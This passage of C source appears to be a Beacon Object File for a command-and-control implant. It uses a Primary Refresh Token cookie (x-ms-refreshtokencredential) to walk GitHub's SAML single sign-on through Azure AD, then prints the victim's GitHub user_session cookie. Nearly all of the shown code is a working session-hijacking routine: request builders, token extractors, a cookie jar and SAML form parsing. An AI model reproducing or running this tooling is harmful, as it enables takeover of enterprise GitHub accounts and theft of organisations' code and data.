            }

            if (!hit) return NULL;

            // Find the closing quote
            const char* url_start = hit;
            const char* url_end = url_start;

            // Determine which quote was used
            char quote = *(hit - 1);
            if (quote != '"' && quote != '\'') {
                quote = '"'; // Default to double quote
            }

            while (url_end < end && *url_end != quote) {
                url_end++;
            }

            if (url_end <= url_start || url_end >= end) {
                p = hit + 1;
                continue;
            }

            size_t url_len = (size_t)(url_end - url_start);
            char* out = (char*)intAlloc(url_len + 1);
            if (!out) return NULL;

            memcpy(out, url_start, url_len);
            out[url_len] = '\0';

            // Decode HTML entities (&amp; -> &)
            char* amp_pos = out;
            while ((amp_pos = strstr(amp_pos, "&amp;")) != NULL) {
                memmove(amp_pos + 1, amp_pos + 5, strlen(amp_pos + 5) + 1);
                amp_pos++;
            }

            return out;
        }

        return NULL;
    }

    // ==================== REQUEST 2: POST SAML INITIATE ====================
    char* perform_request_2_post_saml_initiate(HINTERNET hSession, HINTERNET hConnect, const char* token, CookieJar* cookieJar) {
        char* azureAdUrl = NULL;
        char* postData = NULL;
        char* encodedToken = NULL;
        char* resp = NULL;
        char* headers = NULL;
        char* cookieHeader = NULL;
        size_t resp_len = 0;
        HINTERNET hRequest = NULL;
        int postDataLen = 0;
        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);

        // URL encode the authenticity token
        encodedToken = url_encode(token);
        if (!encodedToken) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to URL encode authenticity_token");
            return NULL;
        }

        // Build POST data
        size_t postDataSize = strlen("authenticity_token=") + strlen(encodedToken) + 1;
        postData = (char*)intAlloc(postDataSize);
        if (!postData) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for POST data");
            intFree(encodedToken);
            return NULL;
        }

        postDataLen = _snprintf(postData, postDataSize, "authenticity_token=%s", encodedToken);

        // Build cookie header from jar
        cookieHeader = build_cookie_header(cookieJar);

        // Build headers with manual cookies
        headers = (char*)intAlloc(HEADER_BUFFER_SIZE);
        if (!headers) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for headers");
            intFree(encodedToken);
            intFree(postData);
            if (cookieHeader) intFree(cookieHeader);
            return NULL;
        }

        if (cookieHeader) {
            _snprintf(headers, HEADER_BUFFER_SIZE,
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Cookie: %s\r\n"
                "Origin: https://" GITHUB_HOST "\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Referer: https://" GITHUB_HOST GITHUB_SSO_PATH "\r\n",
                cookieHeader);
        }
        else {
            _snprintf(headers, HEADER_BUFFER_SIZE,
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Origin: https://" GITHUB_HOST "\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Referer: https://" GITHUB_HOST GITHUB_SSO_PATH "\r\n");
        }

        hRequest = create_http_request(
            hConnect,
            "POST",
            GITHUB_SAML_INITIATE_PATH,
            "https://" GITHUB_HOST GITHUB_SSO_PATH,
            INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION |
            INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT
            // NO_COOKIES flag is added in create_http_request
        );

        if (!hRequest) {
            goto cleanup;
        }

        if (!send_http_request(hRequest, headers, postData, postDataLen)) {
            goto cleanup;
        }

        // Check status code
        HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
            &statusCode, &statusCodeSize, NULL);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] POST response status code: %lu", statusCode);

        // Update cookies from response
        extract_all_cookies_from_response(hRequest, cookieJar);

        // Read the response body
        resp = read_http_response(hRequest, &resp_len);
        if (!resp || resp_len == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[!] No response body received");
            goto cleanup;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Response body size: %lu bytes", resp_len);

        // Extract the URL from meta refresh tag
        azureAdUrl = ExtractSAMLUrl(resp, resp_len);
        if (!azureAdUrl) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract Azure AD URL from meta refresh tag");
            // Try to check if it's a redirect header anyway
            if (statusCode >= 300 && statusCode < 400) {
                azureAdUrl = get_location_header(hRequest);
                if (azureAdUrl) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] Found redirect in Location header instead");
                }
            }
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Extracted Azure AD URL from meta refresh: %.100s...", azureAdUrl);
        }

    cleanup:
        if (cookieHeader) intFree(cookieHeader);
        if (headers) intFree(headers);
        if (resp) intFree(resp);
        if (encodedToken) intFree(encodedToken);
        if (postData) intFree(postData);
        if (hRequest) InternetCloseHandle(hRequest);
        return azureAdUrl;
    }

    BOOL perform_request_3_azure_ad_auth(HINTERNET hSession, const char* azureAdUrl, const char* prtCookie, char** outSamlResponse, char** outRelayState) {
        char* samlResponse = NULL;
        char* relayState = NULL;
        char* resp = NULL;
        DWORD request_flags = 0;
        size_t resp_len = 0;
        HINTERNET hConnect = NULL;
        HINTERNET hRequest = NULL;
        char* headers = NULL;
        INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
        BOOL is_https = TRUE;
        BOOL success = FALSE;
        char samlToken[] = "name=\"SAMLResponse\"";
        char relayToken[] = "name=\"RelayState\"";
        char* host = (char*)intAlloc(HOST_BUFFER_SIZE);
        char* path = (char*)intAlloc(PATH_BUFFER_SIZE);

        // Initialize output parameters
        *outSamlResponse = NULL;
        *outRelayState = NULL;

        if (!host || !path) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for URL parsing");
            goto cleanup;
        }

        parse_url(azureAdUrl, host, HOST_BUFFER_SIZE, path, PATH_BUFFER_SIZE, &port, &is_https);

        // Connect to Azure AD
        hConnect = InternetConnectA(
            hSession,
            host,
            port,
            NULL, NULL,
            INTERNET_SERVICE_HTTP,
            0, 0
        );

        if (!hConnect) {
            print_last_error("[!] InternetConnect to Azure AD failed");
            goto cleanup;
        }

        request_flags = (is_https ? INTERNET_FLAG_SECURE : 0) |
            INTERNET_FLAG_KEEP_CONNECTION |
            INTERNET_FLAG_NO_CACHE_WRITE |
            INTERNET_FLAG_NO_AUTO_REDIRECT;

        hRequest = create_http_request(
            hConnect,
            "GET",
            path,
            "https://" GITHUB_HOST GITHUB_SAML_INITIATE_PATH,
            request_flags
        );

        if (!hRequest) {
            goto cleanup;
        }

        // Add Cookie header with PRT manually
        headers = (char*)intAlloc(HEADER_BUFFER_SIZE);
        if (!headers) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for headers");
            goto cleanup;
        }

        _snprintf(headers, HEADER_BUFFER_SIZE,
            "Cookie: x-ms-refreshtokencredential=%s\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
            prtCookie);

        if (!send_http_request(hRequest, headers, NULL, 0)) {
            goto cleanup;
        }

        // Read response body
        resp = read_http_response(hRequest, &resp_len);
        if (resp && resp_len > 0) {
            samlResponse = extract_saml_response(resp, resp_len, samlToken);
            relayState = extract_saml_response(resp, resp_len, relayToken);

            if (samlResponse && relayState) {
                // Success - transfer ownership to output parameters
                *outSamlResponse = samlResponse;
                *outRelayState = relayState;
                samlResponse = NULL;  // Prevent cleanup from freeing
                relayState = NULL;    // Prevent cleanup from freeing
                success = TRUE;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully extracted SAMLResponse and RelayState");
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract SAMLResponse or RelayState from Azure AD response");
                // Clean up partial results
                if (samlResponse) {
                    intFree(samlResponse);
                    samlResponse = NULL;
                }
                if (relayState) {
                    intFree(relayState);
                    relayState = NULL;
                }
            }
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read response from Azure AD");
        }

    cleanup:
        if (headers) intFree(headers);
        if (resp) intFree(resp);
        if (samlResponse) intFree(samlResponse);  // Only non-NULL if transfer failed
        if (relayState) intFree(relayState);      // Only non-NULL if transfer failed
        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (host) intFree(host);
        if (path) intFree(path);

        return success;
    }

    // ==================== REQUEST 4: POST SAML CONSUME ====================
    void perform_request_4_post_saml_consume(HINTERNET hSession, HINTERNET hConnect, const char* samlResponse, const char* relayState, CookieJar* cookieJar) {
        char* encodedSamlResponse = NULL;
        char* postData = NULL;
        char* headers = NULL;
        char* cookieHeader = NULL;
        HINTERNET hRequest = NULL;
        int attempt = 0;

        // URL encode the SAML response
        encodedSamlResponse = url_encode(samlResponse);
        if (!encodedSamlResponse) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to URL encode SAMLResponse");
            return;
        }

        // Build POST data
        size_t postDataLen = strlen("SAMLResponse=") + strlen(encodedSamlResponse) + strlen("&") + strlen("RelayState=") + strlen(relayState) + 1;
        postData = (char*)intAlloc(postDataLen);
        if (!postData) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for POST data");
            goto cleanup;
        }

        _snprintf(postData, postDataLen, "SAMLResponse=%s&RelayState=%s", encodedSamlResponse, relayState);

        // Attempt POST twice if needed for cookie handling
        for (attempt = 1; attempt <= 2; attempt++) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] POST Attempt %d to consume endpoint", attempt);

            // Build cookie header from jar
            cookieHeader = build_cookie_header(cookieJar);

            // Build headers with manual cookies
            headers = (char*)intAlloc(HEADER_BUFFER_SIZE);
            if (!headers) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for headers");
                if (cookieHeader) intFree(cookieHeader);
                continue;
            }

            if (cookieHeader) {
                _snprintf(headers, HEADER_BUFFER_SIZE,
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Cookie: %s\r\n"
                    "Origin: https://" AZURE_AD_HOST "\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                    "Referer: https://" AZURE_AD_HOST "/\r\n",
                    cookieHeader);
            }
            else {
                _snprintf(headers, HEADER_BUFFER_SIZE,
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Origin: https://" AZURE_AD_HOST "\r\n"
                    "Upgrade-Insecure-Requests: 1\r\n"
                    "Referer: https://" AZURE_AD_HOST "/\r\n");
            }

            hRequest = create_http_request(
                hConnect,
                "POST",
                GITHUB_SAML_CONSUME_PATH,
                "https://" AZURE_AD_HOST "/",
                INTERNET_FLAG_SECURE | INTERNET_FLAG_KEEP_CONNECTION |
                INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_NO_CACHE_WRITE
                // NO_COOKIES flag is added in create_http_request
            );

            if (!hRequest) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create request for attempt %d", attempt);
                if (cookieHeader) intFree(cookieHeader);
                if (headers) intFree(headers);
                continue;
            }

            if (!send_http_request(hRequest, headers, postData, (DWORD)strlen(postData))) {
                BeaconPrintf(CALLBACK_ERROR, "[!] Failed to send request for attempt %d", attempt);
                InternetCloseHandle(hRequest);
                if (cookieHeader) intFree(cookieHeader);
                if (headers) intFree(headers);
                continue;
            }

            DWORD statusCode = 0;
            DWORD statusCodeSize = sizeof(statusCode);
            HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                &statusCode, &statusCodeSize, NULL);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempt %d - Status Code: %lu", attempt, statusCode);

            // Update cookies from response
            extract_all_cookies_from_response(hRequest, cookieJar);

            // Read response to ensure cookies are processed
            size_t resp_len = 0;
            char* resp = read_http_response(hRequest, &resp_len);
            if (resp) intFree(resp);

            InternetCloseHandle(hRequest);
            hRequest = NULL;
            if (cookieHeader) {
                intFree(cookieHeader);
                cookieHeader = NULL;
            }
            if (headers) {
                intFree(headers);
                headers = NULL;
            }
        }

        // Print final session cookies
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Final Session Cookies:");
        for (int i = 0; i < cookieJar->count; i++) {
            if (strncmp(cookieJar->cookies[i], "user_session=", 13) == 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "%s",  cookieJar->cookies[i]);
                break;
            }
        }

    cleanup:
        if (hRequest) InternetCloseHandle(hRequest);
        if (cookieHeader) intFree(cookieHeader);
        if (headers) intFree(headers);
        if (postData) intFree(postData);
        if (encodedSamlResponse) intFree(encodedSamlResponse);
    }

    // ==================== HELPER FUNCTIONS ====================
    char* extract_saml_response(const char* data, size_t len, char* key) {
        const char* end = data + len;
        size_t needle_len = strlen(key);
        const char* p = data;

        while (p + needle_len < end) {
            const char* hit = NULL;
            for (const char* s = p; s + needle_len < end; ++s) {
                if (*s == 'n' && (size_t)(end - s) >= needle_len && memcmp(s, key, needle_len) == 0) {
                    hit = s;
                    break;
                }
            }

            if (!hit) return NULL;

            const char* tag_end = hit;
            while (tag_end < end && *tag_end != '>') tag_end++;
            if (tag_end >= end) return NULL;

            const char* value_key = "value=";
            const size_t value_key_len = 6;
            const char* value_pos = NULL;

            for (const char* s = hit; s + value_key_len < tag_end; ++s) {
                if ((size_t)(tag_end - s) >= value_key_len && memcmp(s, value_key, value_key_len) == 0) {
                    value_pos = s + value_key_len;
                    break;
                }
            }

            if (!value_pos) {
                const char* tag_start = hit;
                while (tag_start > data && *tag_start != '<') tag_start--;
                if (*tag_start == '<') {
                    for (const char* s = tag_start; s + value_key_len < tag_end; ++s) {
                        if ((size_t)(tag_end - s) >= value_key_len && memcmp(s, value_key, value_key_len) == 0) {
                            value_pos = s + value_key_len;
                            break;
                        }
                    }
                }
            }

            if (!value_pos || value_pos >= tag_end) {
                p = hit + needle_len;
                continue;
            }

            char quote = *value_pos;
            if (quote != '"' && quote != '\'') {
                p = hit + needle_len;
                continue;
            }

            const char* val_start = value_pos + 1;
            const char* val_end = val_start;
            while (val_end < tag_end && *val_end != quote) val_end++;
            if (val_end >= tag_end) return NULL;

            size_t out_len = (size_t)(val_end - val_start);
            char* out = (char*)intAlloc(out_len + 1);
            if (!out) return NULL;

            memcpy(out, val_start, out_len);
            out[out_len] = '\0';
            return out;
        }

        return NULL;
    }

    char* url_encode(const char* str) {
        if (!str) return NULL;

        size_t len = strlen(str);
        char* encoded = (char*)intAlloc(len * 3 + 1);
        if (!encoded) return NULL;

        char* pOutput = encoded;
        for (size_t i = 0; i < len; i++) {
            unsigned char c = (unsigned char)str[i];
            if ((c >= '0' && c <= '9') ||
                (c >= 'A' && c <= 'Z') ||
                (c >= 'a' && c <= 'z') ||
                c == '-' || c == '_' || c == '.' || c == '~') {
                *pOutput++ = c;
            }
            else {
                sprintf(pOutput, "%%%02X", c);
                pOutput += 3;
            }
        }
        *pOutput = '\0';

        return encoded;
    }

    char* get_location_header(HINTERNET hRequest) {
        DWORD bufferSize = 0;
        HttpQueryInfoA(hRequest, HTTP_QUERY_LOCATION, NULL, &bufferSize, NULL);

        if (bufferSize == 0) {
            return NULL;
        }

        char* location = (char*)intAlloc(bufferSize + 1);
        if (!location) return NULL;

        if (!HttpQueryInfoA(hRequest, HTTP_QUERY_LOCATION, location, &bufferSize, NULL)) {
            intFree(location);
            return NULL;
        }

        location[bufferSize] = '\0';
        return location;
    }

    void parse_url(const char* url, char* host, size_t host_size, char* path, size_t path_size, INTERNET_PORT* port, BOOL* is_https) {
        const char* p = url;

        if (strncmp(p, "https://", 8) == 0) {
            *is_https = TRUE;
            *port = INTERNET_DEFAULT_HTTPS_PORT;
            p += 8;
        }
        else if (strncmp(p, "http://", 7) == 0) {
            *is_https = FALSE;
            *port = INTERNET_DEFAULT_HTTP_PORT;
            p += 7;
        }
        else {
            host[0] = '\0';
            strncpy(path, url, path_size - 1);
            path[path_size - 1] = '\0';
            return;
        }

        const char* host_end = p;
        while (*host_end && *host_end != '/' && *host_end != ':') {
            host_end++;
        }

        size_t host_len = host_end - p;
        if (host_len >= host_size) host_len = host_size - 1;
        strncpy(host, p, host_len);
        host[host_len] = '\0';

        p = host_end;
        if (*p == ':') {
            p++;
            *port = (INTERNET_PORT)atoi(p);
            while (*p && *p != '/') p++;
        }

        if (*p == '/') {
            strncpy(path, p, path_size - 1);
            path[path_size - 1] = '\0';
        }
        else {
            strcpy(path, "/");
        }
    }

    static int append_bytes(char** out, size_t* out_len, size_t* out_cap, const char* src, size_t src_len) {
        if (src_len == 0) return 1;

        if (*out_len + src_len + 1 > *out_cap) {
            size_t new_cap = (*out_cap == 0) ? 8192 : *out_cap;
            while (new_cap < *out_len + src_len + 1) new_cap *= 2;
            char* p = (char*)intAlloc(new_cap);
            if (!p) return 0;
            if (*out) {
                memcpy(p, *out, *out_len);
                intFree(*out);
            }
            *out = p;
            *out_cap = new_cap;
        }

        memcpy(*out + *out_len, src, src_len);
        *out_len += src_len;
        (*out)[*out_len] = '\0';
        return 1;
    }

    char* retrieveParamValue(const char* data, DWORD len, const char* param) {
        if (!data || !param) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Invalid parameters for retrieveParamValue");
            return NULL;
        }

        size_t paramLen = strlen(param);
        const char* end = data + len;

        for (const char* p = data; p < end - (paramLen + 1); ++p) {
            if ((*p == '?' || *p == '&') &&
                (size_t)(end - p) > paramLen + 1 &&
                strncmp(p + 1, param, paramLen) == 0 &&
                p[1 + paramLen] == '=') {

                const char* valStart = p + 1 + paramLen + 1;
                const char* valEnd = valStart;

                while (valEnd < end && *valEnd != '&' && *valEnd != '#' &&
                    *valEnd != '"' && *valEnd != '\'') {
                    valEnd++;
                }

                size_t vlen = valEnd - valStart;
                char* out = (char*)intAlloc(vlen + 1);
                if (!out) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed for parameter value");
                    return NULL;
                }

                memcpy(out, valStart, vlen);
                out[vlen] = '\0';
                return out;
            }
        }

        BeaconPrintf(CALLBACK_ERROR, "[!] Parameter %s not found", param);
        return NULL;
    }

    char* extract_authenticity_token(const char* data, size_t len) {
        const char* end = data + len;
        const char needle[] = "name=\"authenticity_token\"";
        const size_t needle_len = sizeof(needle) - 1;
        const char* p = data;

        while (p + needle_len < end) {
            const char* hit = NULL;
            for (const char* s = p; s + needle_len < end; ++s) {
                if (*s == 'n' && (size_t)(end - s) >= needle_len && memcmp(s, needle, needle_len) == 0) {
                    hit = s;
                    break;
                }
            }

            if (!hit) return NULL;

            const char* tag_end = hit;
            while (tag_end < end && *tag_end != '>') tag_end++;
            if (tag_end >= end) return NULL;

            const char* value_key = "value=";
            const size_t value_key_len = 6;
            const char* value_pos = NULL;

            for (const char* s = hit; s + value_key_len < tag_end; ++s) {
                if ((size_t)(tag_end - s) >= value_key_len && memcmp(s, value_key, value_key_len) == 0) {
                    value_pos = s + value_key_len;
                    break;
                }
            }

            if (!value_pos) {
                const char* tag_start = hit;
                while (tag_start > data && *tag_start != '<') tag_start--;
                if (*tag_start == '<') {
                    for (const char* s = tag_start; s + value_key_len < tag_end; ++s) {
                        if ((size_t)(tag_end - s) >= value_key_len && memcmp(s, value_key, value_key_len) == 0) {
                            value_pos = s + value_key_len;
                            break;
                        }
                    }
                }
            }

            if (!value_pos || value_pos >= tag_end) {
                p = hit + needle_len;
                continue;
            }

            char quote = *value_pos;
            if (quote != '"' && quote != '\'') {
                p = hit + needle_len;
                continue;
            }

            const char* val_start = value_pos + 1;
            const char* val_end = val_start;
            while (val_end < tag_end && *val_end != quote) val_end++;
            if (val_end >= tag_end) return NULL;

            size_t out_len = (size_t)(val_end - val_start);
            char* out = (char*)intAlloc(out_len + 1);
            if (!out) return NULL;

            memcpy(out, val_start, out_len);
            out[out_len] = '\0';
            return out;
        }

        return NULL;
    }

    static void print_last_error(const char* msg) {
        DWORD err = GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "%s (Error: %lu)", msg, err);
    }

    void clear_all_cookies() {
        if (!InternetSetOptionA(NULL, INTERNET_OPTION_END_BROWSER_SESSION, NULL, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to clear session (Error: %lu)", GetLastError());
        }
    }

    LONG PvectoredExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
        _endthreadex(ExceptionInfo->ExceptionRecord->ExceptionCode);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // ==================== CLEANUP ====================
    void bofstop() {
#ifdef DYNAMIC_LIB_COUNT
        DWORD i;
        for (i = 0; i < loadedLibrariesCount; i++) {
            FreeLibrary(loadedLibraries[i].hMod);
        }
#endif
        return;
    }

}

// ==================== DEBUG/TEST CODE ====================
#if defined(_DEBUG) && !defined(_GTEST)
int main(int argc, char* argv[]) {
    bof::runMocked<>(go, NULL);
    return 0;
}
#elif defined(_GTEST)
#include <gtest\gtest.h>
TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got = bof::runMocked<>(go);
}
#endif